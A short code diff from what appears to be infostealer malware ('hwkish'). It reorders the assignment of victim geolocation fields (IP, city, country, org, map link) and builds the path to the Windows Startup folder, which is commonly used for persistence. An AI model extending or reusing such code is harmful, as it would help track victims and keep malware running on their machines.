@@ -439,13 +439,13 @@ class hwkish_first_funct(Functions):
         )
 
         (
-            self.city,
-            self.region,
-            self.country,
             self.ip,
-            self.googlemap,
+            self.city,
+            self.country,
+            self.region,
             self.org,
             self.loc,
+            self.googlemap,
         ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
 
         self.localstartup = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
